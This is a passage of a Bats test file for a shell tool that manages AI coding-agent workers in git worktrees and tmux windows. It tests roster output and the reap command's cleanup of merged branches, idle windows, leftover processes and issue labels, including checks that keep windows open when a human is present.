  wt_path="$BATS_TEST_TMPDIR/roster-dead-wt"
  git worktree add -q "$wt_path" feat/roster-dead
  wt_path=$(cd "$wt_path" && pwd -P) # see canonicalization note above
  stub_tmux "" "$(printf 'fish %s\n' "$wt_path")"
  CREW_ID=c1 run_crew status "worker:feat/roster-dead#s1-1" working
  CREW_ID=c1 run_crew status "worker:feat/roster-dead#s1-1" exited
  run run_crew roster c1
  [ "$(echo "$output" | jq -r '.[0].state')" = "exited" ]
  [ "$(echo "$output" | jq -r '.[0].exit_suspect // "none"')" = "none" ]
}

# The path match is exact, never a prefix (crew.sh:64): the old `"claude $wtpath"*`
# glob matched /wt/foobar when $wtpath was /wt/foo. A pane sitting at a sibling
# path that merely shares the prefix must not resolve the exited row.
@test "roster: a live engine at a sibling path does not resolve the exited row" {
  git commit --allow-empty -q -m init
  git branch feat/roster-sib
  wt_path="$BATS_TEST_TMPDIR/roster-sib-wt"
  git worktree add -q "$wt_path" feat/roster-sib
  wt_path=$(cd "$wt_path" && pwd -P) # see canonicalization note above
  stub_tmux "" "$(printf '.claude-wrapped %s-sibling\n' "$wt_path")"
  CREW_ID=c1 run_crew status "worker:feat/roster-sib#s1-1" working
  CREW_ID=c1 run_crew status "worker:feat/roster-sib#s1-1" exited
  run run_crew roster c1
  [ "$(echo "$output" | jq -r '.[0].state')" = "exited" ]
  [ "$(echo "$output" | jq -r '.[0].exit_suspect // "none"')" = "none" ]
}

@test "roster: joins the title on the branch" {
  log="$(git rev-parse --path-format=absolute --git-common-dir)/crew/events.jsonl"
  mkdir -p "$(dirname "$log")"
  jq -nc '{ts:1, crew_id:"c1", kind:"dispatch", branch:"feat/x", session:"s1-1", title:"Do a thing"}' >>"$log"
  CREW_ID=c1 run_crew status "worker:feat/x#s1-1" working
  run run_crew roster c1
  [ "$(echo "$output" | jq -r '.[0].title')" = "Do a thing" ]
}

@test "roster: joins engine/model/tier on the branch" {
  log="$(git rev-parse --path-format=absolute --git-common-dir)/crew/events.jsonl"
  mkdir -p "$(dirname "$log")"
  jq -nc '{ts:1000, crew_id:"c1", kind:"dispatch", branch:"feat/x", session:"s1-1",
           engine:"claude", model:"sonnet", tier:"standard", title:"T"}' >>"$log"
  CREW_ID=c1 run_crew status "worker:feat/x#s1-1" working
  run run_crew roster c1
  [ "$(echo "$output" | jq -r '.[0].engine')" = "claude" ]
  [ "$(echo "$output" | jq -r '.[0].model')" = "sonnet" ]
  [ "$(echo "$output" | jq -r '.[0].tier')" = "standard" ]
}

@test "roster: engine/model/tier default to null with no dispatch event" {
  CREW_ID=c1 run_crew status "worker:feat/x" working
  run run_crew roster c1
  [ "$(echo "$output" | jq -r '.[0].engine')" = "null" ]
  [ "$(echo "$output" | jq -r '.[0].model')" = "null" ]
  [ "$(echo "$output" | jq -r '.[0].tier')" = "null" ]
}

@test "roster: a legacy branch-keyed row still renders" {
  CREW_ID=c1 run_crew status "worker:feat/x" working
  run run_crew roster c1
  [ "$(echo "$output" | jq -r 'length')" = "1" ]
  [ "$(echo "$output" | jq -r '.[0].branch')" = "feat/x" ]
  [ "$(echo "$output" | jq -r '.[0].session')" = "null" ]
}

@test "report: rows resolve for a sessioned worker id" {
  log="$(git rev-parse --path-format=absolute --git-common-dir)/crew/events.jsonl"
  mkdir -p "$(dirname "$log")"
  jq -nc '{ts:1000, crew_id:"c1", kind:"dispatch", branch:"feat/x", session:"s1-1",
           engine:"claude", model:"sonnet", tier:"standard", effort:"medium", title:"T"}' >>"$log"
  CREW_ID=c1 run_crew status "worker:feat/x#s1-1" working
  CREW_ID=c1 run_crew status "worker:feat/x#s1-1" done
  run run_crew report c1
  [[ "$output" == *"done"* ]]
}

@test "rate: sweeps a sessioned worker and records its session" {
  log="$(git rev-parse --path-format=absolute --git-common-dir)/crew/events.jsonl"
  mkdir -p "$(dirname "$log")"
  jq -nc '{ts:1000, crew_id:"c1", kind:"dispatch", branch:"feat/x", session:"s1-1",
           engine:"claude", model:"sonnet", tier:"standard", effort:"medium", title:"T"}' >>"$log"
  CREW_ID=c1 run_crew status "worker:feat/x#s1-1" pr_open "" https://example.com/pr/1
  export XDG_DATA_HOME="$BATS_TEST_TMPDIR/share"
  run run_crew rate
  [ "$status" -eq 0 ]
  run jq -r '"\(.branch) \(.session) \(.reached_pr)"' "$XDG_DATA_HOME/crew/ratings.jsonl"
  [ "$output" = "feat/x s1-1 true" ]
}

@test "reap: a sessioned worker becomes a candidate" {
  git commit --allow-empty -q -m init
  git branch feat/reap-me
  wt_path="$BATS_TEST_TMPDIR/reap-me-wt"
  git worktree add -q "$wt_path" feat/reap-me
  stub_bin gh
  cat >"$STUB_DIR/gh" <<'EOF'
#!/usr/bin/env bash
printf '%s\n' "$*" >>"$STUB_LOG"
case "$*" in
*state*) printf '%s\n' 'MERGED' ;;
esac
exit 0
EOF
  chmod +x "$STUB_DIR/gh"
  stub_bin wt
  CREW_ID=c1 run_crew status "worker:feat/reap-me#s1-1" done "" "https://example.com/pr/1"
  CREW_ID=c1 run run_crew reap --dry-run
  [[ "$output" == *"would reap feat/reap-me"* ]]
}

@test "reap: dry-run reports leftover processes whose cwd is in the worktree" {
  git commit --allow-empty -q -m init
  git branch feat/reap-me
  wt_path="$BATS_TEST_TMPDIR/reap-proc-wt"
  git worktree add -q "$wt_path" feat/reap-me
  stub_bin gh
  cat >"$STUB_DIR/gh" <<'EOF'
#!/usr/bin/env bash
printf '%s\n' "$*" >>"$STUB_LOG"
case "$*" in
*state*) printf '%s\n' 'MERGED' ;;
esac
exit 0
EOF
  chmod +x "$STUB_DIR/gh"
  stub_bin wt
  export CREW_REAP_PROC_CMD="printf '4242\t$wt_path/subdir\n9999\t/elsewhere\n'"
  CREW_ID=c1 run_crew status "worker:feat/reap-me#s1-1" done "" "https://example.com/pr/1"
  CREW_ID=c1 run run_crew reap --dry-run
  [[ "$output" == *"would kill pid 4242"* ]]
  [[ "$output" != *"would kill pid 9999"* ]]
}

@test "reap: a real run kills (best-effort) leftover worktree processes" {
  # kill is best-effort: the fake pid below does not exist, so `kill 4242 || true`
  # succeeds via the || true and the say still fires. The assertion is the wiring:
  # the step runs before the removal and names the right pid, never the /elsewhere one.
  git commit --allow-empty -q -m init
  git branch feat/reap-me
  wt_path="$BATS_TEST_TMPDIR/reap-proc-real-wt"
  git worktree add -q "$wt_path" feat/reap-me
  stub_bin gh
  cat >"$STUB_DIR/gh" <<'EOF'
#!/usr/bin/env bash
printf '%s\n' "$*" >>"$STUB_LOG"
case "$*" in
*state*) printf '%s\n' 'MERGED' ;;
esac
exit 0
EOF
  chmod +x "$STUB_DIR/gh"
  stub_bin wt
  export CREW_REAP_PROC_CMD="printf '4242\t$wt_path/subdir\n9999\t/elsewhere\n'"
  CREW_ID=c1 run_crew status "worker:feat/reap-me#s1-1" done "" "https://example.com/pr/1"
  CREW_ID=c1 run run_crew reap
  [[ "$output" == *"killed pid 4242"* ]]
  [[ "$output" != *"killed pid 9999"* ]]
}

@test "reap: keeps a worktree whose pane runs the wrapped engine" {
  git commit --allow-empty -q -m init
  git branch feat/reap-live
  wt_path="$BATS_TEST_TMPDIR/reap-live-wt"
  git worktree add -q "$wt_path" feat/reap-live
  wt_path=$(cd "$wt_path" && pwd -P) # see canonicalization note above
  stub_bin gh
  cat >"$STUB_DIR/gh" <<'EOF'
#!/usr/bin/env bash
printf '%s\n' "$*" >>"$STUB_LOG"
case "$*" in
*state*) printf '%s\n' 'MERGED' ;;
esac
exit 0
EOF
  chmod +x "$STUB_DIR/gh"
  stub_bin wt
  # 4-field panes query, no frame planted: an unreadable/empty capture keeps
  # too (defensive rule), so this still asserts the same substring.
  stub_tmux_frames "" "$(printf '@1\t%%1\t.claude-wrapped\t%s\n' "$wt_path")"
  CREW_ID=c1 run_crew status "worker:feat/reap-live#s1-1" done "" "https://example.com/pr/1"
  CREW_ID=c1 run run_crew reap
  [[ "$output" == *"an engine is still running there"* ]]
  [ -d "$wt_path" ]
  run ! grep -q remove "$STUB_LOG"
}

# Same exact-path requirement as the roster sibling-path test above, exercised
# through reap's own _pane_is_engine_at call site.
@test "reap: a sibling-path engine pane does not keep the worktree" {
  git commit --allow-empty -q -m init
  git branch feat/reap-sib
  wt_path="$BATS_TEST_TMPDIR/reap-sib-wt"
  git worktree add -q "$wt_path" feat/reap-sib
  wt_path=$(cd "$wt_path" && pwd -P) # see canonicalization note above
  stub_bin gh
  cat >"$STUB_DIR/gh" <<'EOF'
#!/usr/bin/env bash
printf '%s\n' "$*" >>"$STUB_LOG"
case "$*" in
*state*) printf '%s\n' 'MERGED' ;;
esac
exit 0
EOF
  chmod +x "$STUB_DIR/gh"
  stub_bin wt
  stub_tmux_frames "" "$(printf '@1\t%%1\t.claude-wrapped\t%s-sibling\n' "$wt_path")"
  CREW_ID=c1 run_crew status "worker:feat/reap-sib#s1-1" done "" "https://example.com/pr/1"
  CREW_ID=c1 run run_crew reap
  [[ "$output" != *"an engine is still running there"* ]]
}

@test "reap: releases a terminal session's window past --idle, keeping the worktree" {
  git commit --allow-empty -q -m init
  git branch feat/idle-me
  wt_path="$BATS_TEST_TMPDIR/idle-wt"
  git worktree add -q "$wt_path" feat/idle-me
  wt_path=$(cd "$wt_path" && pwd -P) # see canonicalization note above
  stub_bin gh
  stub_bin wt
  stub_tmux "$(printf '@23\tsage\t%s\n' "$wt_path")" "$(printf '@23\t%%33\tfish\n')"
  CREW_ID=c1 run_crew status "worker:feat/idle-me#s1-1" failed "gate never passed"
  CREW_ID=c1 run run_crew reap --idle 0 --quiet
  [ "$status" -eq 0 ]
  [[ "$output" == *"released @23"* ]]
  grep -q 'kill-window -t @23' "$STUB_LOG"
  [ -d "$wt_path" ]
  log="$(git rev-parse --path-format=absolute --git-common-dir)/crew/events.jsonl"
  run jq -r 'select(.kind=="release") | "\(.branch) \(.session) \(.state)"' "$log"
  [ "$output" = "feat/idle-me s1-1 failed" ]
}

_live_claude_done_setup() {
  git commit --allow-empty -q -m init
  git branch feat/idle-done-live
  wt_path="$BATS_TEST_TMPDIR/idle-done-live-wt"
  git worktree add -q "$wt_path" feat/idle-done-live
  wt_path=$(cd "$wt_path" && pwd -P) # see canonicalization note above
  stub_bin gh
  stub_bin wt
  export CREW_RELEASE_GAP=0
  stub_tmux_frames "$(printf '@23\tsage\t%s\n' "$wt_path")" "" "$(printf '@23\t%%33\t.claude-wrapped\n')"
}

@test "reap: releases a done window once its claude pane is provably idle on two samples" {
  _live_claude_done_setup
  CREW_ID=c1 run_crew status "worker:feat/idle-done-live#s1-1" done
  set_frame %33 <<'EOF'
  ⎿  Done (14 tool uses · 58.2k tokens · 1m 9s)
✻ Churned for 36s · done 11:20 AM
────────────────── reef ─
❯
──────────────────
  -- INSERT -- ⏵⏵ auto mode on · ← for agents
EOF
  CREW_ID=c1 run run_crew reap --idle 0 --quiet
  [ "$status" -eq 0 ]
  [[ "$output" == *"released @23"* ]]
  grep -q 'kill-window -t @23' "$STUB_LOG"
}

@test "reap: keeps a done window whose claude pane shows a live turn, at the default flags" {
  _live_claude_done_setup
  set_frame %33 <<'EOF'
  ⎿  Done (14 tool uses · 58.2k tokens · 1m 9s)
✳ Perusing… (1m2s · ↓ 3.1k tokens · thinking more with high effort)
EOF
  log="$(git rev-parse --path-format=absolute --git-common-dir)/crew/events.jsonl"
  old_ts=$((($(date +%s) - 400) * 1000))
  jq -nc --argjson ts "$old_ts" '{ts:$ts, crew_id:"c1", from:"worker:feat/idle-done-live#s1-1", to:"dispatcher:c1", kind:"status", body:{state:"done"}}' >>"$log"
  CREW_ID=c1 run run_crew reap
  [ "$status" -eq 0 ]
  [[ "$output" == *"keeping feat/idle-done-live — pane busy"* ]]
  run ! grep -q 'kill-window' "$STUB_LOG"
}

@test "reap: keeps a done window whose pane changes between the two samples" {
  _live_claude_done_setup
  CREW_ID=c1 run_crew status "worker:feat/idle-done-live#s1-1" done
  set_frame %33 <<'EOF'
✻ Churned for 36s · done 11:20 AM
❯
EOF
  set_frame %33.2 <<'EOF'
✻ Churned for 37s · done 11:20 AM
❯
EOF
  CREW_ID=c1 run run_crew reap --idle 0
  [[ "$output" == *"pane busy: %33 is still changing"* ]]
  run ! grep -q 'kill-window' "$STUB_LOG"
}

@test "reap: never releases a watchdog-posted failed window" {
  _live_claude_done_setup
  set_frame %33 <<'EOF'
✻ Churned for 36s · done 11:20 AM
────────────────── reef ─
❯
──────────────────
  -- INSERT -- ⏵⏵ auto mode on · ← for agents
EOF
  seed_raw "worker:feat/idle-done-live#s1-1" failed "dead: quiet: no output" watchdog "$((($(date +%s) - 400) * 1000))"
  CREW_ID=c1 run run_crew reap --idle 0
  [[ "$output" != *"released"* ]]
  [[ "$output" != *"pane busy"* ]]
  run ! grep -q 'kill-window' "$STUB_LOG"
}

@test "reap: keeps a done window whose pane cannot be read" {
  _live_claude_done_setup
  CREW_ID=c1 run_crew status "worker:feat/idle-done-live#s1-1" done
  CREW_ID=c1 run run_crew reap --idle 0
  [[ "$output" == *"pane busy: %33 is unreadable"* ]]
  run ! grep -q 'kill-window' "$STUB_LOG"
}

@test "reap: keeps a done window whose non-claude engine pane shows a prompt" {
  _live_claude_done_setup
  stub_tmux_frames "$(printf '@23\tsage\t%s\n' "$wt_path")" "" "$(printf '@23\t%%33\tpi\n')"
  set_frame %33 <<'EOF'
  2. Gate everything on 3.8
 Enter to select · ↑/↓ to navigate · Esc to cancel
EOF
  CREW_ID=c1 run_crew status "worker:feat/idle-done-live#s1-1" done
  CREW_ID=c1 run run_crew reap --idle 0
  [[ "$output" == *"pane busy: %33 shows a prompt"* ]]
  run ! grep -q 'kill-window' "$STUB_LOG"
}

@test "reap: a second busy engine pane in the window keeps it" {
  _live_claude_done_setup
  stub_tmux_frames "$(printf '@23\tsage\t%s\n' "$wt_path")" "" "$(printf '@23\t%%33\t.claude-wrapped\n@23\t%%34\t.claude-wrapped\n')"
  set_frame %33 <<'EOF'
✻ Churned for 36s · done 11:20 AM
────────────────── reef ─
❯
──────────────────
  -- INSERT -- ⏵⏵ auto mode on · ← for agents
EOF
  set_frame %34 <<'EOF'
✳ Perusing… (1m2s · ↓ 3.1k tokens · thinking more with high effort)
EOF
  CREW_ID=c1 run_crew status "worker:feat/idle-done-live#s1-1" done
  CREW_ID=c1 run run_crew reap --idle 0
  [[ "$output" == *"pane busy: %34"* ]]
  run ! grep -q 'kill-window' "$STUB_LOG"
}

@test "reap: default grace releases a done window older than it and keeps a younger one" {
  git commit --allow-empty -q -m init
  git branch feat/old-done
  git branch feat/new-done
  old_wt="$BATS_TEST_TMPDIR/old-done-wt"
  new_wt="$BATS_TEST_TMPDIR/new-done-wt"
  git worktree add -q "$old_wt" feat/old-done
  git worktree add -q "$new_wt" feat/new-done
  old_wt=$(cd "$old_wt" && pwd -P)
  new_wt=$(cd "$new_wt" && pwd -P)
  stub_bin gh
  stub_bin wt
  stub_tmux "$(printf '@23\tsage\t%s\n@24\tbird\t%s\n' "$old_wt" "$new_wt")" "$(printf '@23\t%%33\tfish\n@24\t%%34\tfish\n')"
  log="$(git rev-parse --path-format=absolute --git-common-dir)/crew/events.jsonl"
  mkdir -p "$(dirname "$log")"
  old_ts=$((($(date +%s) - 400) * 1000))
  new_ts=$((($(date +%s) - 100) * 1000))
  jq -nc --argjson ts "$old_ts" '{ts:$ts, crew_id:"c1", from:"worker:feat/old-done#s1-1", to:"dispatcher:c1", kind:"status", body:{state:"done"}}' >>"$log"
  jq -nc --argjson ts "$new_ts" '{ts:$ts, crew_id:"c1", from:"worker:feat/new-done#s1-1", to:"dispatcher:c1", kind:"status", body:{state:"done"}}' >>"$log"
  CREW_ID=c1 run run_crew reap --quiet
  [ "$status" -eq 0 ]
  grep -q 'kill-window -t @23' "$STUB_LOG"
  run ! grep -q 'kill-window -t @24' "$STUB_LOG"
}

_human_setup() {
  git commit --allow-empty -q -m init
  git branch feat/human
  human_wt="$BATS_TEST_TMPDIR/human-wt"
  git worktree add -q "$human_wt" feat/human
  human_wt=$(cd "$human_wt" && pwd -P)
  stub_bin gh
  stub_bin wt
  stub_tmux "$(printf '@23\tsage\t%s\n' "$human_wt")" "$(printf '@23\t%%33\tfish\n')"
  CREW_ID=c1 run_crew status "worker:feat/human#s1-1" done
}

@test "reap: keeps a done window that is visible in an attached tmux client" {
  _human_setup
  printf '@23\t1\t1\t%s\n' "$(($(date +%s) - 9999))" >"$STUB_DIR/human.txt"
  CREW_ID=c1 run run_crew reap --idle 0
  [ "$status" -eq 0 ]
  [[ "$output" == *"keeping feat/human — human present: @23 is visible in an attached tmux client"* ]]
  run ! grep -q 'kill-window' "$STUB_LOG"
}

@test "reap: a done window that is active but in a detached session is released" {
  _human_setup
  printf '@23\t1\t0\t%s\n' "$(($(date +%s) - 9999))" >"$STUB_DIR/human.txt"
  CREW_ID=c1 run run_crew reap --idle 0 --quiet
  grep -q 'kill-window -t @23' "$STUB_LOG"
}

@test "reap: keeps a done window with activity inside the grace" {
  _human_setup
  printf '@23\t0\t0\t%s\n' "$(($(date +%s) - 5))" >"$STUB_DIR/human.txt"
  CREW_ID=c1 run run_crew reap --idle 60
  run ! grep -q 'kill-window' "$STUB_LOG"
}

@test "reap: keeps a done window whose transcript has a user turn newer than the status" {
  _human_setup
  export CLAUDE_CONFIG_DIR="$BATS_TEST_TMPDIR/claude"
  tdir="$CLAUDE_CONFIG_DIR/projects/$(printf '%s' "$human_wt" | sed 's/[^A-Za-z0-9]/-/g')"
  mkdir -p "$tdir"
  newer=$(date -u -d '+30 seconds' +%Y-%m-%dT%H:%M:%S.000Z)
  printf '%s\n' \
    '{"type":"user","timestamp":"2020-01-01T00:00:00.000Z","message":{"content":"start"}}' \
    "{\"type\":\"user\",\"timestamp\":\"$newer\",\"message\":{\"content\":[{\"type\":\"text\",\"text\":\"hi\"}]}}" >"$tdir/s.jsonl"
  CREW_ID=c1 run run_crew reap --idle 0
  [ "$status" -eq 0 ]
  [[ "$output" == *"human present: the engine transcript has a user turn newer than the status"* ]]
  run ! grep -q 'kill-window' "$STUB_LOG"
}

@test "reap: an old user turn and a newer tool result do not count as a human" {
  _human_setup
  export CLAUDE_CONFIG_DIR="$BATS_TEST_TMPDIR/claude"
  tdir="$CLAUDE_CONFIG_DIR/projects/$(printf '%s' "$human_wt" | sed 's/[^A-Za-z0-9]/-/g')"
  mkdir -p "$tdir"
  newer=$(date -u -d '+30 seconds' +%Y-%m-%dT%H:%M:%S.000Z)
  printf '%s\n' \
    '{"type":"user","timestamp":"2020-01-01T00:00:00.000Z","message":{"content":"start"}}' \
    "{\"type\":\"user\",\"timestamp\":\"$newer\",\"message\":{\"content\":[{\"type\":\"tool_result\",\"content\":\"ok\"}]}}" >"$tdir/s.jsonl"
  CREW_ID=c1 run run_crew reap --idle 0 --quiet
  grep -q 'kill-window -t @23' "$STUB_LOG"
}

@test "reap: keeps an idle exited window when an engine is still live" {
  git commit --allow-empty -q -m init
  git branch feat/idle-exited-live
  wt_path="$BATS_TEST_TMPDIR/idle-exited-live-wt"
  git worktree add -q "$wt_path" feat/idle-exited-live
  wt_path=$(cd "$wt_path" && pwd -P) # see canonicalization note above
  stub_bin gh
  stub_bin wt
  stub_tmux "$(printf '@23\tsage\t%s\n' "$wt_path")" "$(printf '@23\t%%33\t.claude-wrapped\n')"
  CREW_ID=c1 run_crew status "worker:feat/idle-exited-live#s1-1" exited
  CREW_ID=c1 run run_crew reap --idle 0
  [ "$status" -eq 0 ]
  [[ "$output" == *"keeping feat/idle-exited-live — exited but an engine is still running there"* ]]
  run ! grep -q 'kill-window' "$STUB_LOG"
}

@test "reap: leaves a terminal session inside --idle alone" {
  git commit --allow-empty -q -m init
  git branch feat/idle-me
  wt_path="$BATS_TEST_TMPDIR/idle-wt"
  git worktree add -q "$wt_path" feat/idle-me
  stub_bin gh
  stub_bin wt
  stub_tmux "$(printf '@23\tsage\t%s\n' "$wt_path")" "$(printf '@23\t%%33\tfish\n')"
  CREW_ID=c1 run_crew status "worker:feat/idle-me#s1-1" failed
  CREW_ID=c1 run run_crew reap --idle 3600
  [ "$status" -eq 0 ]
  run ! grep -q 'kill-window' "$STUB_LOG"
}

@test "reap: never releases a non-terminal session" {
  git commit --allow-empty -q -m init
  git branch feat/busy
  wt_path="$BATS_TEST_TMPDIR/busy-wt"
  git worktree add -q "$wt_path" feat/busy
  stub_bin gh
  stub_bin wt
  stub_tmux "$(printf '@23\tsage\t%s\n' "$wt_path")" "$(printf '@23\t%%33\tclaude\n')"
  CREW_ID=c1 run_crew status "worker:feat/busy#s1-1" working
  CREW_ID=c1 run run_crew reap --idle 0
  run ! grep -q 'kill-window' "$STUB_LOG"
}

# One worktree hosts at most one live window, so idle release must collapse the
# branch to its NEWEST session before testing terminality. An older `done`
# session must not release a window a newer `working` session still owns.
@test "reap: a newer working session masks an older done one on the same branch" {
  git commit --allow-empty -q -m init
  git branch feat/two-sess
  wt_path="$BATS_TEST_TMPDIR/two-sess-wt"
  git worktree add -q "$wt_path" feat/two-sess
  stub_bin gh
  stub_bin wt
  stub_tmux "$(printf '@23\tsage\t%s\n' "$wt_path")" "$(printf '@23\t%%33\tclaude\n')"
  log="$(git rev-parse --path-format=absolute --git-common-dir)/crew/events.jsonl"
  mkdir -p "$(dirname "$log")"
  jq -nc '{ts:1000, crew_id:"c1", from:"worker:feat/two-sess#s1-1", to:"dispatcher:c1", kind:"status", body:{state:"done"}}' >>"$log"
  jq -nc '{ts:2000, crew_id:"c1", from:"worker:feat/two-sess#s2-2", to:"dispatcher:c1", kind:"status", body:{state:"working"}}' >>"$log"
  CREW_ID=c1 run run_crew reap --idle 0
  [ "$status" -eq 0 ]
  run ! grep -q 'kill-window' "$STUB_LOG"
}

@test "reap: --dry-run only reports the release" {
  git commit --allow-empty -q -m init
  git branch feat/idle-me
  wt_path="$BATS_TEST_TMPDIR/idle-wt"
  git worktree add -q "$wt_path" feat/idle-me
  wt_path=$(cd "$wt_path" && pwd -P) # see canonicalization note above
  stub_bin gh
  stub_bin wt
  stub_tmux "$(printf '@23\tsage\t%s\n' "$wt_path")" "$(printf '@23\t%%33\tfish\n')"
  CREW_ID=c1 run_crew status "worker:feat/idle-me#s1-1" done
  CREW_ID=c1 run run_crew reap --idle 0 --dry-run
  [[ "$output" == *"would release @23"* ]]
  run ! grep -q 'kill-window' "$STUB_LOG"
}

@test "reap: rejects a non-numeric --idle" {
  CREW_ID=c1 run run_crew reap --idle nope
  [ "$status" -eq 1 ]
  [[ "$output" == *"--idle"* ]]
}

@test "reap: removes the dispatched label from the issue a merged PR closes" {
  git commit -q --allow-empty -m init
  git branch feat/42-reap-me
  wt_path="$BATS_TEST_TMPDIR/reap-me-wt"
  git worktree add -q "$wt_path" feat/42-reap-me
  stub_tmux "" ""
  cat >"$STUB_DIR/gh" <<'EOF'
#!/usr/bin/env bash
printf '%s\n' "$*" >>"$STUB_LOG"
case "$*" in
*state*) printf '%s\n' 'MERGED' ;;
*closingIssuesReferences*) printf '%s\n' '42' ;;
*headRefOid*) printf '%s\n' "$(git rev-parse refs/heads/feat/42-reap-me)" ;;
esac
exit 0
EOF
  chmod +x "$STUB_DIR/gh"
  CREW_ID=c1 run_crew status "worker:feat/42-reap-me" done "" "https://example.com/pr/7"
  CREW_ID=c1 run run_crew reap --quiet
  [ "$status" -eq 0 ]
  [[ "$output" == *"reaped feat/42-reap-me"* ]]
  grep -q 'pr view https://example.com/pr/7 --json closingIssuesReferences' "$STUB_LOG"
  grep -q 'issue edit 42 --remove-label dispatched' "$STUB_LOG"
  # A merged PR's squash-merged branch is not an ancestor of main — reap
  # deletes it deliberately once gh confirms the merge (#194). The stub's
  # headRefOid answers the local tip so the delete guard passes.
  run ! git show-ref --verify --quiet refs/heads/feat/42-reap-me
}

@test "reap: releases the dispatched label from every issue a bundled PR closes (#615)" {
  git commit -q --allow-empty -m init
  git branch feat/42-reap-bundle
  wt_path="$BATS_TEST_TMPDIR/reap-bundle-wt"
  git worktree add -q "$wt_path" feat/42-reap-bundle
  stub_tmux "" ""
  cat >"$STUB_DIR/gh" <<'EOF'
#!/usr/bin/env bash
printf '%s\n' "$*" >>"$STUB_LOG"
case "$*" in
*state*) printf '%s\n' 'MERGED' ;;
*closingIssuesReferences*) printf '%s\n' 42 43 44 ;;
*headRefOid*) printf '%s\n' "$(git rev-parse refs/heads/feat/42-reap-bundle)" ;;
esac
exit 0
EOF
  chmod +x "$STUB_DIR/gh"
  CREW_ID=c1 run_crew status "worker:feat/42-reap-bundle" done "" "https://example.com/pr/8"
  CREW_ID=c1 run run_crew reap --quiet
  [ "$status" -eq 0 ]
  [[ "$output" == *"reaped feat/42-reap-bundle"* ]]
  grep -q 'issue edit 42 --remove-label dispatched' "$STUB_LOG"
  grep -q 'issue edit 43 --remove-label dispatched' "$STUB_LOG"
  grep -q 'issue edit 44 --remove-label dispatched' "$STUB_LOG"
}

@test "reap: a dispatched label-removal failure does not abort the sweep" {
  git commit -q --allow-empty -m init
  git branch feat/43-reap-me
  wt_path="$BATS_TEST_TMPDIR/reap-me-wt2"
  git worktree add -q "$wt_path" feat/43-reap-me
  stub_tmux "" ""
  cat >"$STUB_DIR/gh" <<'EOF'
#!/usr/bin/env bash
printf '%s\n' "$*" >>"$STUB_LOG"
case "$*" in
*state*) printf '%s\n' 'MERGED' ;;
*closingIssuesReferences*) printf '%s\n' '43' ;;
*remove-label*) exit 1 ;;
esac
exit 0
EOF
  chmod +x "$STUB_DIR/gh"
  CREW_ID=c1 run_crew status "worker:feat/43-reap-me" done "" "https://example.com/pr/9"
  CREW_ID=c1 run run_crew reap
  [ "$status" -eq 0 ]
  [[ "$output" == *"reaped feat/43-reap-me"* ]]
  [[ "$output" == *"could not remove the dispatched label from #43"* ]]
}

@test "reap: a failed closing-issue resolution is logged, not treated as no closing issue" {
  git commit -q --allow-empty -m init
  git branch feat/45-reap-me
  wt_path="$BATS_TEST_TMPDIR/reap-me-wt4"
  git worktree add -q "$wt_path" feat/45-reap-me
  stub_tmux "" ""
  cat >"$STUB_DIR/gh" <<'EOF'
#!/usr/bin/env bash
printf '%s\n' "$*" >>"$STUB_LOG"
case "$*" in
*state*) printf '%s\n' 'MERGED' ;;
*closingIssuesReferences*)
  echo "gh: rate limited" >&2
  exit 1
  ;;
esac
exit 0
EOF
  chmod +x "$STUB_DIR/gh"
  CREW_ID=c1 run_crew status "worker:feat/45-reap-me" done "" "https://example.com/pr/11"
  CREW_ID=c1 run run_crew reap
  [ "$status" -eq 0 ]
  [[ "$output" == *"reaped feat/45-reap-me"* ]]
  [[ "$output" == *"could not resolve closing issues for PR https://example.com/pr/11 (feat/45-reap-me)"* ]]
  run ! grep -q 'issue edit' "$STUB_LOG"
}

@test "reap: a PR with no closing issue reaps without attempting a label removal" {
  git commit -q --allow-empty -m init
  git branch feat/44-reap-me
  wt_path="$BATS_TEST_TMPDIR/reap-me-wt3"
  git worktree add -q "$wt_path" feat/44-reap-me
  stub_tmux "" ""
  cat >"$STUB_DIR/gh" <<'EOF'
#!/usr/bin/env bash
printf '%s\n' "$*" >>"$STUB_LOG"
case "$*" in
*state*) printf '%s\n' 'MERGED' ;;
*closingIssuesReferences*) printf '' ;;
esac
exit 0
EOF
  chmod +x "$STUB_DIR/gh"
  CREW_ID=c1 run_crew status "worker:feat/44-reap-me" done "" "https://example.com/pr/10"
  CREW_ID=c1 run run_crew reap --quiet
  [ "$status" -eq 0 ]
  [[ "$output" == *"reaped feat/44-reap-me"* ]]
  run ! grep -q 'issue edit' "$STUB_LOG"
}

@test "reap: a squash-merged PR is reaped by outcome — reap row, label, branch deletion" {
  # #194 Gap 1: this repo squash-merges, so a merged PR's branch is never an
  # ancestor of main. The removal never deletes the branch, and reap must judge
  # success by the observable outcome (the worktree is gone): write the reap
  # row, release the dispatched label, and delete the local branch deliberately.
  git commit -q --allow-empty -m init
  git branch feat/squash-me
  wt_path="$BATS_TEST_TMPDIR/squash-wt"
  git worktree add -q "$wt_path" feat/squash-me
  wt_path=$(cd "$wt_path" && pwd -P)
  # The squash shape from the wild: the branch really is ahead of main (its
  # commits are gone from the squash merge), which is why git reads it as
  # unmerged and why reap must delete it deliberately.
  echo unique >"$wt_path/work.txt"
  git -C "$wt_path" add work.txt
  git -C "$wt_path" commit -q -m "squash-me work"
  stub_tmux "" ""
  cat >"$STUB_DIR/gh" <<'EOF'
#!/usr/bin/env bash
printf '%s\n' "$*" >>"$STUB_LOG"
case "$*" in
*state*) printf '%s\n' 'MERGED' ;;
*closingIssuesReferences*) printf '%s\n' '99' ;;
*headRefOid*) printf '%s\n' "$(git rev-parse refs/heads/feat/squash-me)" ;;
esac
exit 0
EOF
  chmod +x "$STUB_DIR/gh"
  cat >"$STUB_DIR/wt" <<'EOF'
#!/usr/bin/env bash
printf 'wt %s\n' "$*" >>"$STUB_LOG"
exit 1
EOF
  chmod +x "$STUB_DIR/wt"
  log="$(git rev-parse --path-format=absolute --git-common-dir)/crew/events.jsonl"
  CREW_ID=c1 run_crew status "worker:feat/squash-me" done "" "https://example.com/pr/8"
  CREW_ID=c1 run run_crew reap --quiet
  [ "$status" -eq 0 ]
  [[ "$output" == *"reaped feat/squash-me (MERGED)"* ]]
  grep -q 'pr view https://example.com/pr/8 --json closingIssuesReferences' "$STUB_LOG"
  grep -q 'issue edit 99 --remove-label dispatched' "$STUB_LOG"
  jq -e 'select(.kind=="reap" and .branch=="feat/squash-me")' "$log" >/dev/null
  [ ! -d "$wt_path" ]
  run ! git show-ref --verify --quiet refs/heads/feat/squash-me
  run ! grep -q '^wt ' "$STUB_LOG"
}

@test "reap: a merged worker's anchor record is pruned (#556)" {
  git commit -q --allow-empty -m init
  git branch feat/anchor-me
